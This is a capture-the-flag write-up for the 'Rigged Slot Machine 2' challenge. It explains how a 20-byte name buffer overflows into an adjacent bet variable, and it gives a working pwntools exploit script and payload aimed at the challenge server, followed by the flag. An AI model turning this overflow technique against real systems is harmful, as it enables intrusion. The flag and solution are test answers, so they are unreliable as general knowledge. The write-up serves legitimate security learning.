We have a program similar to Rigged Slot Machine1, but it checks if our **bank_limit** is equal to 1337420, and if so, it gives us a flag.

We have a buffer overflow error in the **enter_name()** function:

![image](https://hackmd.io/_uploads/S1pa_SdM1e.png)

Since our array has a maximum of 20 characters, and it is right below the **bet** variable - our bet value

![image](https://hackmd.io/_uploads/Byd8YBOGkx.png)

![image](https://hackmd.io/_uploads/By0mYBuf1g.png)

Now we just need to overflow **bet** to a value greater than 1337420 and bet with that excess value and we will have a flag.

Script: 
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rigged_slot2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("riggedslot2.ctf.intigriti.io", 1337)

    return r


def main():
    r = conn()
    input()
    payload = b'A'*20 + p32(0x146851)
    r.sendlineafter(b'name:', payload)
    pause()
    r.sendlineafter(b'spin):', b'5')
    pause()
    info(r.recvall(3))
    pause()
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

```
Result:

![image](https://hackmd.io/_uploads/SykYFH_Myl.png)

Flag: ```INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}```
